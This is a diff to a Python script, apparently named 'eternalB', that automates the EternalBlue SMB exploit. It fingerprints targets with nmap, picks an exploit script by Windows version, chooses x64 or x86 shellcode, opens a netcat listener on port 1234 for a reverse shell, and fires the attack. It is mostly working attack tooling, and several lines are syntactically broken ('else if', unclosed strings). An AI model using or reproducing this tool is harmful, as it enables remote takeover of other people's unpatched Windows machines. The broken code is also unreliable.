@@ -3,6 +3,10 @@ import subprocess as sp
 import netifaces as ni
 
 
+def installRequiements():
+	sp.call(["sudo", "pip", "install", "-r", "requirements.txt"])
+
+
 def clearAndTitle():
 	sp.call(["clear"])
 	print(pf.figlet_format("eternalB", font="larry3d"))
@@ -59,17 +63,47 @@ def checkVuln(ip):
 	return False
 
 
-def choseTarget(vulnList):
+def chooseTarget(vulnList):
 	for i in vulnList:
 		print("[" + str(vulnList.index(i)) + "]" + " " + i)
 	return vulnList[int(input("Choose the target: "))]
 	
 
-#def execVuln(target):
-#	shellPrep()
-#
-#
-#
+def execVuln(target):
+	shellPrep(target)
+	os = getOS(target)
+	script = ""
+	shellcode = ""
+	
+	if os in ["Microsoft Windows 2012", "Microsoft Windows 2016", "Microsoft Windows 10", "Microsoft Windows 8", "Microsoft Windows 8.1"]:
+		sp.run(["sudo", "chmod", "+x", "eternalblue_exploit10.py"])
+		script = "eternalblue_exploit10.py"
+	else if os in ["Microsoft Windows 7", "Microsoft Windows 2008"]:
+		sp.run(["sudo", "chmod", "+x", "eternalblue_exploit7.py"])
+		script = "eternalblue_exploit7.py"
+	else:
+		sp.run(["sudo", "chmod", "+x", "zzz_exploit.py"])
+		script = "zzz_exploit.py"
+
+	print("Please insert the target os architecture? [64/32]bit")
+	y = input()
+	if y in ["64", "64bit", "64Bit", "64BIT", "64 bit", "64 Bit", "64 BIT", ""]:
+		shellcode = "shellcode/sc_x64.bin
+	else if y in ["32", "32bit", "32Bit", "32BIT", "32 bit", "32 Bit", "32 BIT"]:
+		shellcode = "shellcode/sc_x86.bin
+	else:
+		print("Please insert a valid option"
+		exit()
+
+	print("Everything ready, would you like to execute the attack? [Y/n]")
+	y = input()
+	if y not in ["y", "Y", ""]:
+		print("Goodbye!")
+		exit()
+
+	sp.run(["gnome-terminal", "--", "nc", "-nvlp", "1234"])
+	sp.run(["python", script, target, shellcode])
+
 
 
 def getIP():
@@ -80,20 +114,19 @@ def getIP():
 	return ip
 
 
-def getOS():
-	ip = "192.168.1.152"
+def getOS(ip):
 	p = sp.Popen(["sudo","nmap","-O", ip], stdout=sp.PIPE).stdout
 	t = p.read().splitlines()
 	t = [x.decode("utf-8") for x in t]
 	res = ""
 	for i in t:
-		if "Aggressive OS guesses" in i:
-			res = i[23:i.find("(")-1]
+		if "Running:" in i:
+			res = i[9:]
 			print(res)
 
 
 
-def shellPrep():
+def shellPrep(targetIp):
 	targetIp="LHOST=192.168.69.99" #da passare
 	portx64="LPORT=1234"
 	portx86="LPORT=1234"
@@ -119,6 +152,8 @@ def shellPrep():
 #                                                                              #
 
 if __name__ == "__main__":
+	clearAndTitle()
+	installRequiements()
 	clearAndTitle()
 	print("Would you like to execute the first scan? [Y/n]")
 	y = input()
@@ -147,5 +182,5 @@ if __name__ == "__main__":
 		print("Unfortunately there are 0 IPs vulnerable")
 		exit()
 	target = chooseTarget(vulnList)
-	#execVuln(target)
+	execVuln(target)
 	
